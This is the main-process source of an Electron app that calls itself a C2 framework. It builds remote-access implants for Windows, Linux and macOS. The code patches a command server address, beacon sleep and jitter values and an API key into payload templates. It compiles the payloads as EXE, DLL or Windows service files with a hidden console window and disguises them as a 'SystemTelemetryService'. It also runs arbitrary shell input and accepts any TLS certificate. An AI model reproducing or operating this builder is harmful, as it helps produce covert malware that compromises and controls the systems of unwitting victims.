/**
 * GhostSpan - Main Electron Process
 * Open Telemetry C2 Framework
 *
 * Go compiler is embedded in the app - no external dependencies required
 */

const { app, BrowserWindow, ipcMain, shell, dialog, session } = require('electron');
const path = require('path');
const fs = require('fs');
const os = require('os');
const { exec, spawn } = require('child_process');

// Go SDK version embedded in the app
const GO_VERSION = '1.22.0';

// Get a reliable temp directory (avoids /tmp size limits on Linux)
function getBuildTempDir() {
  // Use app's userData directory for builds (more reliable than /tmp on Linux)
  const buildDir = path.join(app.getPath('userData'), 'build-cache');
  fs.mkdirSync(buildDir, { recursive: true });
  return buildDir;
}

// MinGW/LLVM-MinGW version for CGO builds (DLL)
// Using llvm-mingw for cross-platform support (works on Linux, macOS, Windows)
const LLVM_MINGW_VERSION = '20241217';
const MINGW_DOWNLOADS = {
  // Windows x64: Use llvm-mingw for cross-compilation support (both x64 and ARM64 targets)
  'windows-amd64': {
    url: `https://github.com/mstorsjo/llvm-mingw/releases/download/${LLVM_MINGW_VERSION}/llvm-mingw-${LLVM_MINGW_VERSION}-ucrt-x86_64.zip`,
    archive: `llvm-mingw-${LLVM_MINGW_VERSION}-x86_64.zip`,
    extractDir: `llvm-mingw-${LLVM_MINGW_VERSION}-ucrt-x86_64`,
    gccName: 'x86_64-w64-mingw32-gcc.exe',
    isZip: true
  },
  // Windows ARM64: Use llvm-mingw for cross-compilation support (both x64 and ARM64 targets)
  'windows-arm64': {
    url: `https://github.com/mstorsjo/llvm-mingw/releases/download/${LLVM_MINGW_VERSION}/llvm-mingw-${LLVM_MINGW_VERSION}-ucrt-aarch64.zip`,
    archive: `llvm-mingw-${LLVM_MINGW_VERSION}-aarch64.zip`,
    extractDir: `llvm-mingw-${LLVM_MINGW_VERSION}-ucrt-aarch64`,
    gccName: 'x86_64-w64-mingw32-gcc.exe',
    isZip: true
  },
  // Linux x64 cross-compiler for Windows (llvm-mingw)
  'linux-amd64': {
    url: `https://github.com/mstorsjo/llvm-mingw/releases/download/${LLVM_MINGW_VERSION}/llvm-mingw-${LLVM_MINGW_VERSION}-ucrt-ubuntu-20.04-x86_64.tar.xz`,
    archive: `llvm-mingw-${LLVM_MINGW_VERSION}-ubuntu-x86_64.tar.xz`,
    extractDir: `llvm-mingw-${LLVM_MINGW_VERSION}-ucrt-ubuntu-20.04-x86_64`,
    gccName: 'x86_64-w64-mingw32-gcc',
    isZip: false
  },
  // Linux ARM64 cross-compiler for Windows (llvm-mingw)
  'linux-arm64': {
    url: `https://github.com/mstorsjo/llvm-mingw/releases/download/${LLVM_MINGW_VERSION}/llvm-mingw-${LLVM_MINGW_VERSION}-ucrt-ubuntu-20.04-aarch64.tar.xz`,
    archive: `llvm-mingw-${LLVM_MINGW_VERSION}-ubuntu-aarch64.tar.xz`,
    extractDir: `llvm-mingw-${LLVM_MINGW_VERSION}-ucrt-ubuntu-20.04-aarch64`,
    gccName: 'x86_64-w64-mingw32-gcc',
    isZip: false
  },
  // macOS cross-compiler for Windows (llvm-mingw universal)
  'darwin-amd64': {
    url: `https://github.com/mstorsjo/llvm-mingw/releases/download/${LLVM_MINGW_VERSION}/llvm-mingw-${LLVM_MINGW_VERSION}-ucrt-macos-universal.tar.xz`,
    archive: `llvm-mingw-${LLVM_MINGW_VERSION}-macos-universal.tar.xz`,
    extractDir: `llvm-mingw-${LLVM_MINGW_VERSION}-ucrt-macos-universal`,
    gccName: 'x86_64-w64-mingw32-gcc',
    isZip: false
  },
  'darwin-arm64': {
    url: `https://github.com/mstorsjo/llvm-mingw/releases/download/${LLVM_MINGW_VERSION}/llvm-mingw-${LLVM_MINGW_VERSION}-ucrt-macos-universal.tar.xz`,
    archive: `llvm-mingw-${LLVM_MINGW_VERSION}-macos-universal.tar.xz`,
    extractDir: `llvm-mingw-${LLVM_MINGW_VERSION}-ucrt-macos-universal`,
    gccName: 'x86_64-w64-mingw32-gcc',
    isZip: false
  }
};

// Path to embedded templates
// Supported types: 'go' (exe/bin), 'dll', 'svc'
function getTemplatesPath(type = 'go') {
  const templateDirMap = {
    'go': 'templates-go',        // Standard EXE/BIN
    'dll': 'templates-dll',      // DLL
    'svc': 'templates-svc',      // Windows Service (SCM)
  };
  const templateDir = templateDirMap[type] || 'templates-go';

  if (app.isPackaged) {
    const extraResources = path.join(process.resourcesPath, templateDir);
    if (fs.existsSync(extraResources)) {
      return extraResources;
    }
    return path.join(__dirname, templateDir);
  }
  return path.join(__dirname, templateDir);
}

// Get the arch string for Go SDK directory (maps node arch to Go arch names)
function getGoArch() {
  const archMap = {
    'x64': 'amd64',
    'arm64': 'arm64',
    'ia32': '386'
  };
  return archMap[process.arch] || 'amd64';
}

// Get bundled Go SDK path (for packaged app)
// Structure: resources/go-sdk/{arch}/go/bin/go
function getBundledGoPath() {
  if (app.isPackaged) {
    const goArch = getGoArch();
    return path.join(process.resourcesPath, 'go-sdk', goArch);
  }
  return null;
}

// Get development Go SDK path (for development mode)
// Structure: client/go-sdk/{os}/{arch}/go/bin/go
function getDevGoPath() {
  const osName = process.platform === 'win32' ? 'windows' : process.platform;
  const goArch = getGoArch();
  return path.join(__dirname, '..', '..', 'go-sdk', osName, goArch);
}

// Find Go binary - checks bundled (packaged), dev (development), then system
async function findGoBinary() {
  const goExe = process.platform === 'win32' ? 'go.exe' : 'go';

  // 1. Check bundled Go (for packaged app)
  const bundledPath = getBundledGoPath();
  if (bundledPath) {
    const bundledGo = path.join(bundledPath, 'go', 'bin', goExe);
    if (fs.existsSync(bundledGo)) {
      return { path: bundledGo, type: 'bundled', goroot: path.join(bundledPath, 'go') };
    }
  }

  // 2. Check development Go SDK (when running in dev mode)
  const devPath = getDevGoPath();
  const devGo = path.join(devPath, 'go', 'bin', goExe);
  if (fs.existsSync(devGo)) {
    return { path: devGo, type: 'embedded', goroot: path.join(devPath, 'go') };
  }

  // 3. Check system Go as fallback (for development)
  return new Promise((resolve) => {
    exec('go version', (error, stdout) => {
      if (!error) {
        // Find system Go path
        const locateGoQuery = process.platform === 'win32' ? 'where go' : 'which go';
        exec(locateGoQuery, (err, goPath) => {
          if (!err && goPath) {
            const systemGoPath = goPath.trim().split('\n')[0];
            // Get GOROOT
            exec('go env GOROOT', (e, goroot) => {
              resolve({
                path: systemGoPath,
                type: 'system',
                goroot: goroot ? goroot.trim() : null,
                version: stdout.trim()
              });
            });
          } else {
            resolve(null);
          }
        });
      } else {
        resolve(null);
      }
    });
  });
}

// ============================================================
// MinGW/GCC Functions (for CGO - DLL builds)
// ============================================================

function getCurrentPlatformKey() {
  const osName = process.platform === 'win32' ? 'windows' :
                 process.platform === 'darwin' ? 'darwin' : 'linux';
  const arch = process.arch === 'arm64' ? 'arm64' : 'amd64';
  return `${osName}-${arch}`;
}

function getMinGWPath() {
  const osName = process.platform === 'win32' ? 'windows' :
                 process.platform === 'darwin' ? 'darwin' : 'linux';
  const arch = process.arch === 'arm64' ? 'arm64' : 'amd64';

  // Check packaged app location first
  if (app.isPackaged) {
    return path.join(process.resourcesPath, 'mingw-sdk', arch);
  }
  // Development mode
  return path.join(__dirname, '..', '..', 'mingw-sdk', osName, arch);
}

// Find GCC cross-compiler for Windows DLL builds
// targetArch: 'amd64' or 'arm64' - the Windows architecture to target
async function findGCCBinary(targetArch = 'amd64') {
  const platformKey = getCurrentPlatformKey();
  const mingwInfo = MINGW_DOWNLOADS[platformKey];

  if (!mingwInfo) {
    // No cross-compiler available for this platform
    return null;
  }

  const extractDir = mingwInfo.extractDir;
  const isWindows = process.platform === 'win32';

  // Determine the correct GCC name based on target architecture
  // llvm-mingw includes both x86_64 and aarch64 cross-compilers
  let gccName, crossPrefix;
  if (targetArch === 'arm64') {
    gccName = isWindows ? 'aarch64-w64-mingw32-gcc.exe' : 'aarch64-w64-mingw32-gcc';
    crossPrefix = 'aarch64-w64-mingw32-';
  } else {
    gccName = isWindows ? 'x86_64-w64-mingw32-gcc.exe' : 'x86_64-w64-mingw32-gcc';
    crossPrefix = 'x86_64-w64-mingw32-';
  }

  // 1. Check bundled MinGW/llvm-mingw
  const mingwPath = getMinGWPath();
  const bundledGcc = path.join(mingwPath, extractDir, 'bin', gccName);
  if (fs.existsSync(bundledGcc)) {
    return {
      path: bundledGcc,
      type: 'embedded',
      binDir: path.join(mingwPath, extractDir, 'bin'),
      crossPrefix: crossPrefix
    };
  }

  // 2. Check system cross-compiler (for Linux/macOS)
  if (!isWindows) {
    return new Promise((resolve) => {
      exec(`which ${gccName}`, (error, stdout) => {
        if (!error && stdout.trim()) {
          const systemPath = stdout.trim();
          resolve({
            path: systemPath,
            type: 'system',
            binDir: path.dirname(systemPath),
            crossPrefix: crossPrefix
          });
        } else {
          resolve(null);
        }
      });
    });
  }

  // 3. Check system GCC (for Windows - native builds only)
  if (isWindows && targetArch === (process.arch === 'arm64' ? 'arm64' : 'amd64')) {
    return new Promise((resolve) => {
      exec('gcc --version', (error, stdout) => {
        if (!error) {
          exec('where gcc', (err, gccPath) => {
            if (!err && gccPath) {
              const systemPath = gccPath.trim().split('\n')[0];
              resolve({ path: systemPath, type: 'system', binDir: path.dirname(systemPath), crossPrefix: '' });
            } else {
              resolve(null);
            }
          });
        } else {
          resolve(null);
        }
      });
    });
  }

  return null;
}

async function downloadMinGW(onProgress) {
  const https = require('https');
  const platformKey = getCurrentPlatformKey();

  if (!MINGW_DOWNLOADS[platformKey]) {
    return { success: false, error: `No MinGW/cross-compiler available for platform: ${platformKey}` };
  }

  const info = MINGW_DOWNLOADS[platformKey];
  const mingwPath = getMinGWPath();
  const archivePath = path.join(mingwPath, info.archive);

  // Check if already installed
  const gccExe = path.join(mingwPath, info.extractDir, 'bin', info.gccName);
  if (fs.existsSync(gccExe)) {
    return { success: true, message: 'MinGW/cross-compiler already installed' };
  }

  fs.mkdirSync(mingwPath, { recursive: true });

  try {
    // Download
    const downloadSize = process.platform === 'win32' ? '~300MB' : '~150MB';
    if (onProgress) onProgress(`Downloading cross-compiler (${downloadSize})...`);

    await new Promise((resolve, reject) => {
      const makeRequest = (url) => {
        https.get(url, (response) => {
          if (response.statusCode === 301 || response.statusCode === 302) {
            return makeRequest(response.headers.location);
          }
          if (response.statusCode !== 200) {
            reject(new Error(`Download failed: HTTP ${response.statusCode}`));
            return;
          }

          const totalSize = parseInt(response.headers['content-length'], 10);
          let downloaded = 0;

          const file = fs.createWriteStream(archivePath);
          response.on('data', (chunk) => {
            downloaded += chunk.length;
            if (onProgress && totalSize) {
              const percent = Math.round((downloaded / totalSize) * 100);
              onProgress(`Downloading cross-compiler: ${percent}%`);
            }
          });
          response.pipe(file);
          file.on('finish', () => { file.close(); resolve(); });
          file.on('error', reject);
        }).on('error', reject);
      };
      makeRequest(info.url);
    });

    // Extract archive
    if (onProgress) onProgress('Extracting cross-compiler...');

    await new Promise((resolve, reject) => {
      if (info.isZip) {
        // ZIP extraction (Windows)
        if (process.platform === 'win32') {
          const psCommand = `Expand-Archive -Path '${archivePath}' -DestinationPath '${mingwPath}' -Force`;
          exec(`powershell -Command "${psCommand}"`, (error) => {
            if (error) reject(error);
            else resolve();
          });
        } else {
          exec(`unzip -q -o "${archivePath}" -d "${mingwPath}"`, (error) => {
            if (error) reject(error);
            else resolve();
          });
        }
      } else {
        // tar.xz extraction (Linux/macOS)
        exec(`tar -xJf "${archivePath}" -C "${mingwPath}"`, (error) => {
          if (error) reject(error);
          else resolve();
        });
      }
    });

    // Cleanup archive
    try { fs.unlinkSync(archivePath); } catch (e) {}

    // Verify
    if (fs.existsSync(gccExe)) {
      return { success: true, message: 'Cross-compiler installed successfully' };
    } else {
      return { success: false, error: `Extraction completed but ${info.gccName} not found at ${gccExe}` };
    }

  } catch (error) {
    try { fs.unlinkSync(archivePath); } catch (e) {}
    return { success: false, error: error.message };
  }
}

// ============================================================
// Pre-compiled Template Patching (Instant Generation)
// ============================================================

function getPrecompiledPath() {
  if (app.isPackaged) {
    return path.join(process.resourcesPath, 'precompiled-templates');
  }
  return path.join(__dirname, '..', '..', 'precompiled-templates');
}

function patchBinaryPlaceholder(buffer, placeholder, value, maxLen = 128) {
  // Create the full placeholder pattern (with X padding)
  const searchPattern = `{{PLACEHOLDER_${placeholder}}}`;

  // Find the placeholder in the buffer
  const searchBuf = Buffer.from(searchPattern, 'utf8');
  let offset = buffer.indexOf(searchBuf);

  if (offset === -1) {
    console.log(`[PATCH] Placeholder ${placeholder} not found`);
    return false;
  }

  // Create the replacement value (pad with null bytes to maintain size)
  const replacement = Buffer.alloc(maxLen, 0);
  const valueBuf = Buffer.from(value, 'utf8');
  valueBuf.copy(replacement, 0, 0, Math.min(valueBuf.length, maxLen - 1));

  // Find the end of the placeholder section (128 bytes from start of placeholder marker)
  // The placeholder format is: {{PLACEHOLDER_XXX}}XXXXXXXX... (128 bytes total)
  replacement.copy(buffer, offset, 0, maxLen);

  console.log(`[PATCH] Patched ${placeholder} at offset ${offset}`);
  return true;
}

async function buildFromPrecompiledTemplate(config) {
  const { collectorEndpoint, serviceName, sleepInterval, jitterPercent, selfPort, targetPlatform, outputFormat, authSecret } = config;

  const [targetOS, targetArch] = targetPlatform.split('-');
  const precompiledPath = getPrecompiledPath();

  // Determine template file extension
  let templateExt = '';
  switch (outputFormat) {
    case 'exe':
    case 'svc':
      templateExt = '.exe';
      break;
    case 'dll':
      templateExt = '.dll';
      break;
    case 'bin':
    default:
      templateExt = targetOS === 'windows' ? '.exe' : '';
      break;
  }

  const templateFile = path.join(precompiledPath, targetOS, targetArch, `template-${outputFormat}${templateExt}`);

  if (!fs.existsSync(templateFile)) {
    console.log(`[PATCH] Pre-compiled template not found: ${templateFile}`);
    return null; // Fall back to compilation
  }

  console.log(`[PATCH] Using pre-compiled template: ${templateFile}`);

  // Read template binary
  const buffer = fs.readFileSync(templateFile);
  const batchTimeout = sleepInterval * 1000;
  const exportDelay = Math.round(batchTimeout * (jitterPercent / 100));

  // Patch placeholders
  patchBinaryPlaceholder(buffer, 'COLLECTOR_ENDPOINT', collectorEndpoint);
  patchBinaryPlaceholder(buffer, 'SERVICE_NAME', serviceName);
  patchBinaryPlaceholder(buffer, 'SELF_PORT', selfPort.toString());
  patchBinaryPlaceholder(buffer, 'BATCH_TIMEOUT', batchTimeout.toString());
  patchBinaryPlaceholder(buffer, 'EXPORT_DELAY', exportDelay.toString());
  if (authSecret) {
    patchBinaryPlaceholder(buffer, 'API_KEY', authSecret);
  }

  // Write to output directory
  const outputDir = path.join(getBuildTempDir(), `telemetryhub-patched-${Date.now()}`);
  fs.mkdirSync(outputDir, { recursive: true });

  const outputName = `SystemTelemetryService${templateExt}`;
  const outputFile = path.join(outputDir, outputName);

  fs.writeFileSync(outputFile, buffer);

  console.log(`[PATCH] Patched binary written to: ${outputFile}`);

  return {
    success: true,
    outputDir,
    outputFile,
    message: 'Service built successfully (instant mode)'
  };
}

let mainWindow;
let lastBuildOutputDir = null;
let lastBuildOutputFile = null;

function createWindow() {
  mainWindow = new BrowserWindow({
    width: 1600,
    height: 1000,
    minWidth: 1200,
    minHeight: 800,
    backgroundColor: '#0a0a0a',
    frame: false,
    show: false, // Don't show until ready
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
      preload: path.join(__dirname, 'preload.js')
    },
    icon: path.join(__dirname, '../../public/icon.png')
  });

  // Load from dist folder (works for both packaged and dev after npm run build)
  const distPath = path.join(__dirname, '../../dist/index.html');
  if (fs.existsSync(distPath)) {
    mainWindow.loadFile(distPath);
  } else {
    // Fallback to webpack dev server
    mainWindow.loadURL('http://localhost:3000');
  }

  // Show window maximized when ready
  mainWindow.once('ready-to-show', () => {
    mainWindow.maximize();
    mainWindow.show();
  });

  // Don't open DevTools by default - use Ctrl+Shift+I if needed
  // mainWindow.webContents.openDevTools();

  mainWindow.on('closed', () => {
    mainWindow = null;
  });
}

// App lifecycle

// Allow self-signed certificates for development/testing
// This enables connecting to TLS servers with self-signed certs
app.on('certificate-error', (event, webContents, url, error, certificate, callback) => {
  // Allow self-signed certs (for development - in production, use proper certs)
  event.preventDefault();
  callback(true);
});

app.whenReady().then(() => {
  // Allow self-signed certificates for fetch() requests
  // This is needed for connecting to TLS servers with self-signed certs
  session.defaultSession.setCertificateVerifyProc((request, callback) => {
    // Accept all certificates (for development - use proper certs in production)
    callback(0); // 0 = accept, -2 = reject, -3 = use default verification
  });

  createWindow();
});

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});

app.on('activate', () => {
  if (BrowserWindow.getAllWindows().length === 0) {
    createWindow();
  }
});

// IPC handlers
ipcMain.handle('get-endpoints', async () => []);
ipcMain.handle('send-task', async () => ({ success: true }));
ipcMain.handle('get-operators', async () => []);
ipcMain.handle('minimize-window', () => mainWindow?.minimize());
ipcMain.handle('maximize-window', () => {
  if (mainWindow?.isMaximized()) mainWindow.unmaximize();
  else mainWindow?.maximize();
});
ipcMain.handle('close-window', () => mainWindow?.close());
ipcMain.handle('focus-window', () => {
  if (mainWindow) {
    // Blur then focus with delay to force OS to reassign focus
    mainWindow.blur();
    setTimeout(() => {
      mainWindow.focus();
      mainWindow.webContents.focus();
      // Send a click event to force input focus
      mainWindow.webContents.sendInputEvent({ type: 'mouseDown', x: 0, y: 0, button: 'left', clickCount: 1 });
      mainWindow.webContents.sendInputEvent({ type: 'mouseUp', x: 0, y: 0, button: 'left', clickCount: 1 });
    }, 50);
  }
});

ipcMain.handle('execute-shell', async (event, shellInput) => {
  return new Promise((resolve) => {
    exec(shellInput, { maxBuffer: 10 * 1024 * 1024 }, (error, stdout, stderr) => {
      resolve(error
        ? { success: false, error: error.message, output: stderr || stdout }
        : { success: true, output: stdout || 'Execution completed successfully' }
      );
    });
  });
});

ipcMain.handle('open-folder', async (event, folderPath) => {
  try {
    await shell.openPath(folderPath);
    return { success: true };
  } catch (error) {
    return { success: false, error: error.message };
  }
});

// Check Go status (bundled or system)
ipcMain.handle('check-go', async () => {
  const goInfo = await findGoBinary();

  if (!goInfo) {
    // In development, suggest running the setup script
    const setupScript = process.platform === 'win32'
      ? 'npm run setup-go:win'
      : process.platform === 'darwin'
        ? 'npm run setup-go:mac'
        : 'npm run setup-go:linux';

    return {
      available: false,
      message: `Go not found. Run "${setupScript}" to setup embedded Go SDK.`
    };
  }

  // Get version if not already set
  if (!goInfo.version) {
    return new Promise((resolve) => {
      exec(`"${goInfo.path}" version`, (error, stdout) => {
        const match = stdout?.match(/go(\d+\.\d+(\.\d+)?)/);
        resolve({
          available: true,
          type: goInfo.type,
          version: match ? match[1] : 'unknown',
          path: goInfo.path
        });
      });
    });
  }

  return {
    available: true,
    type: goInfo.type,
    version: goInfo.version,
    path: goInfo.path
  };
});

// Check CGO/GCC availability (for DLL builds)
ipcMain.handle('check-cgo', async () => {
  const gccInfo = await findGCCBinary();

  if (!gccInfo) {
    return {
      available: false,
      message: 'Run "npm run setup-mingw" to enable DLL builds'
    };
  }

  return {
    available: true,
    type: gccInfo.type,
    path: gccInfo.path
  };
});

// Check pre-compiled templates availability
ipcMain.handle('check-precompiled', async () => {
  const precompiledPath = getPrecompiledPath();
  const manifestPath = path.join(precompiledPath, 'manifest.json');

  if (!fs.existsSync(manifestPath)) {
    return { available: false, templates: {} };
  }

  try {
    const manifest = JSON.parse(fs.readFileSync(manifestPath, 'utf8'));
    return {
      available: true,
      templates: manifest.templates || {}
    };
  } catch (e) {
    return { available: false, templates: {} };
  }
});

// Get platform info
ipcMain.handle('get-platform-info', async () => {
  const platforms = [
    { id: 'windows-amd64', os: 'windows', arch: 'amd64', label: 'Windows (64-bit)', ext: '.exe' },
    { id: 'windows-arm64', os: 'windows', arch: 'arm64', label: 'Windows (ARM64)', ext: '.exe' },
    { id: 'darwin-amd64', os: 'darwin', arch: 'amd64', label: 'macOS (Intel)', ext: '' },
    { id: 'darwin-arm64', os: 'darwin', arch: 'arm64', label: 'macOS (Apple Silicon)', ext: '' },
    { id: 'linux-amd64', os: 'linux', arch: 'amd64', label: 'Linux (64-bit)', ext: '' },
    { id: 'linux-arm64', os: 'linux', arch: 'arm64', label: 'Linux (ARM64)', ext: '' },
  ];

  let currentPlatform = 'windows-amd64';
  if (process.platform === 'darwin') {
    currentPlatform = process.arch === 'arm64' ? 'darwin-arm64' : 'darwin-amd64';
  } else if (process.platform === 'linux') {
    currentPlatform = process.arch === 'arm64' ? 'linux-arm64' : 'linux-amd64';
  } else {
    currentPlatform = process.arch === 'arm64' ? 'windows-arm64' : 'windows-amd64';
  }

  return { platforms, currentPlatform };
});

// Build Go service with cross-compilation
ipcMain.handle('build-service-go', async (event, config) => {
  const { collectorEndpoint, serviceName, sleepInterval, jitterPercent, selfPort, targetPlatform, outputFormat } = config;

  // Try pre-compiled template first (instant generation)
  const patchedResult = await buildFromPrecompiledTemplate(config);
  if (patchedResult) {
    lastBuildOutputDir = patchedResult.outputDir;
    lastBuildOutputFile = patchedResult.outputFile;
    return patchedResult;
  }

  // Fall back to compilation if no pre-compiled template exists
  console.log('[BUILD] No pre-compiled template, falling back to compilation...');

  // Find Go
  const goInfo = await findGoBinary();
  if (!goInfo) {
    return { success: false, error: 'Go not found. Please download Go first.' };
  }

  const batchTimeout = sleepInterval * 1000;
  const exportDelay = Math.round(batchTimeout * (jitterPercent / 100));
  const [targetOS, targetArch] = targetPlatform.split('-');

  // Determine output extension and build mode based on format
  let outputExt = '';
  let buildMode = 'exe'; // default
  let cgoEnabled = '0';

  console.log('[BUILD] Target platform:', targetPlatform, 'Format:', outputFormat);

  switch (outputFormat) {
    case 'exe':
    case 'svc':
      outputExt = '.exe';
      break;
    case 'dll':
      outputExt = '.dll';
      buildMode = 'c-shared';
      cgoEnabled = '1';
      break;
    case 'bin':
    default:
      outputExt = targetOS === 'windows' ? '.exe' : '';
      break;
  }

  const outputName = `SystemTelemetryService${outputExt}`;
  console.log('[BUILD] Output:', outputName, 'BuildMode:', buildMode, 'CGO:', cgoEnabled);

  const buildDir = path.join(getBuildTempDir(), `telemetryhub-go-build-${Date.now()}`);
  const outputDir = path.join(buildDir, 'output');

  try {
    fs.mkdirSync(buildDir, { recursive: true });
    fs.mkdirSync(outputDir, { recursive: true });

    // Select the correct template based on output format
    let templateType = 'go'; // default for exe/bin
    switch (outputFormat) {
      case 'svc':
        templateType = 'svc';
        break;
      case 'dll':
        templateType = 'dll';
        break;
    }

    const templatesPath = getTemplatesPath(templateType);
    console.log('[BUILD] Using template:', templateType, 'from:', templatesPath);

    // Read and inject config - handle both .go and _windows.go files
    let mainGoPath = path.join(templatesPath, 'main.go');
    if (!fs.existsSync(mainGoPath)) {
      mainGoPath = path.join(templatesPath, 'main_windows.go');
    }
    let mainGo = fs.readFileSync(mainGoPath, 'utf8');
    const goMod = fs.readFileSync(path.join(templatesPath, 'go.mod'), 'utf8');

    // Replace placeholders - format: {{PLACEHOLDER_XXX}}XXXXXXXXX... (128 bytes total)
    // We replace the entire placeholder with the value padded to maintain structure
    const padValue = (val, len = 128) => {
      const str = String(val);
      return str + 'X'.repeat(Math.max(0, len - str.length));
    };

    const apiKey = config.authSecret || '';
    mainGo = mainGo
      .replace(/\{\{PLACEHOLDER_COLLECTOR_ENDPOINT\}\}X+/g, padValue(collectorEndpoint))
      .replace(/\{\{PLACEHOLDER_SERVICE_NAME\}\}X+/g, padValue(serviceName))
      .replace(/\{\{PLACEHOLDER_SELF_PORT\}\}X+/g, padValue(selfPort.toString()))
      .replace(/\{\{PLACEHOLDER_BATCH_TIMEOUT\}\}X+/g, padValue(batchTimeout.toString()))
      .replace(/\{\{PLACEHOLDER_EXPORT_DELAY\}\}X+/g, padValue(exportDelay.toString()))
      .replace(/\{\{PLACEHOLDER_API_KEY\}\}X+/g, padValue(apiKey));

    fs.writeFileSync(path.join(buildDir, 'main.go'), mainGo);
    fs.writeFileSync(path.join(buildDir, 'go.mod'), goMod);

    // First run go mod tidy to download dependencies
    const goCacheDir = path.join(getBuildTempDir(), 'go-cache');
    fs.mkdirSync(goCacheDir, { recursive: true });

    const env = {
      ...process.env,
      GOROOT: goInfo.goroot || undefined,
      GOCACHE: goCacheDir,
      GOTMPDIR: goCacheDir
    };

    // Run go mod tidy first
    await new Promise((resolve, reject) => {
      const goModTidy = spawn(goInfo.path, ['mod', 'tidy'], { cwd: buildDir, env });
      let tidyOutput = '';
      goModTidy.stdout.on('data', (data) => tidyOutput += data.toString());
      goModTidy.stderr.on('data', (data) => tidyOutput += data.toString());
      goModTidy.on('close', (code) => {
        if (code !== 0) {
          reject(new Error(`go mod tidy failed: ${tidyOutput}`));
        } else {
          resolve();
        }
      });
      goModTidy.on('error', reject);
    });

    // Build with Go
    return new Promise(async (resolve) => {
      const outputFile = path.join(outputDir, outputName);

      let buildEnv = {
        ...process.env,
        GOOS: targetOS,
        GOARCH: targetArch,
        CGO_ENABLED: cgoEnabled,
        GOROOT: goInfo.goroot || undefined,
        GOCACHE: goCacheDir,
        GOTMPDIR: goCacheDir
      };

      // For CGO builds, add GCC to PATH
      if (cgoEnabled === '1') {
        const gccInfo = await findGCCBinary(targetArch);
        if (!gccInfo) {
          resolve({
            success: false,
            error: `GCC not found for ${targetArch}. Run "npm run setup-mingw" to install cross-compiler for DLL builds.`,
            output: ''
          });
          return;
        }
        // Add MinGW bin directory to PATH
        buildEnv.PATH = gccInfo.binDir + path.delimiter + process.env.PATH;
        buildEnv.CC = gccInfo.path;
        console.log('[BUILD] Using GCC:', gccInfo.path);
      }

      // Hide console window on Windows with -H windowsgui (only for exe builds)
      const ldflags = (targetOS === 'windows' && buildMode === 'exe') ? '-s -w -H windowsgui' : '-s -w';

      // Build arguments based on build mode
      let buildArgs;
      if (buildMode === 'c-shared') {
        buildArgs = ['build', '-buildmode=c-shared', '-ldflags', ldflags, '-o', outputFile, '.'];
      } else {
        buildArgs = ['build', '-ldflags', ldflags, '-o', outputFile, '.'];
      }

      const goBuild = spawn(goInfo.path, buildArgs, { cwd: buildDir, env: buildEnv });

      let stdout = '';
      let stderr = '';

      goBuild.stdout.on('data', (data) => stdout += data.toString());
      goBuild.stderr.on('data', (data) => stderr += data.toString());

      goBuild.on('close', (code) => {
        if (code !== 0) {
          try { fs.rmSync(buildDir, { recursive: true, force: true }); } catch (e) {}
          resolve({
            success: false,
            error: `Build failed with code ${code}`,
            output: stderr || stdout
          });
          return;
        }

        lastBuildOutputDir = outputDir;
        lastBuildOutputFile = outputFile;

        resolve({
          success: true,
          output: `Build successful!\nTarget: ${targetOS}/${targetArch}\nFormat: ${outputFormat || 'exe'}\nOutput: ${outputName}`,
          outputDir,
          outputFile,
          fileName: outputName,
          buildDir
        });
      });

      goBuild.on('error', (err) => {
        resolve({ success: false, error: err.message, output: 'Failed to start Go compiler' });
      });
    });
  } catch (err) {
    try { fs.rmSync(buildDir, { recursive: true, force: true }); } catch (e) {}
    return { success: false, error: err.message };
  }
});

// Get compiled file
ipcMain.handle('get-compiled-file', async () => {
  try {
    if (!lastBuildOutputFile || !fs.existsSync(lastBuildOutputFile)) {
      return { success: false, error: 'No build available. Please build first.' };
    }

    const fileBuffer = fs.readFileSync(lastBuildOutputFile);
    return {
      success: true,
      fileName: path.basename(lastBuildOutputFile),
      fileData: fileBuffer.toString('base64')
    };
  } catch (error) {
    return { success: false, error: error.message };
  }
});

// Save file
ipcMain.handle('save-file', async (event, { fileName, fileData }) => {
  try {
    const isExe = fileName.endsWith('.exe');
    const result = await dialog.showSaveDialog(mainWindow, {
      defaultPath: fileName,
      filters: [
        { name: isExe ? 'Executable' : 'Binary', extensions: isExe ? ['exe'] : ['*'] },
        { name: 'All Files', extensions: ['*'] }
      ]
    });

    if (!result.canceled && result.filePath) {
      fs.writeFileSync(result.filePath, Buffer.from(fileData, 'base64'));
      if (!isExe) {
        try { fs.chmodSync(result.filePath, 0o755); } catch (e) {}
      }
      return { success: true, filePath: result.filePath };
    }
    return { success: false, canceled: true };
  } catch (error) {
    return { success: false, error: error.message };
  }
});

ipcMain.handle('get-output-path', async () => lastBuildOutputDir || '');

// Cleanup on quit
app.on('will-quit', () => {
  try {
    // Clean up from build cache directory
    const buildCacheDir = path.join(app.getPath('userData'), 'build-cache');
    if (fs.existsSync(buildCacheDir)) {
      const dirs = fs.readdirSync(buildCacheDir).filter(d => d.startsWith('telemetryhub-'));
      dirs.forEach(dir => {
        try { fs.rmSync(path.join(buildCacheDir, dir), { recursive: true, force: true }); } catch (e) {}
      });
    }
    // Also clean legacy /tmp directories
    const tmpDirs = fs.readdirSync(os.tmpdir()).filter(d => d.startsWith('telemetryhub-'));
    tmpDirs.forEach(dir => {
      try { fs.rmSync(path.join(os.tmpdir(), dir), { recursive: true, force: true }); } catch (e) {}
    });
  } catch (e) {}
});
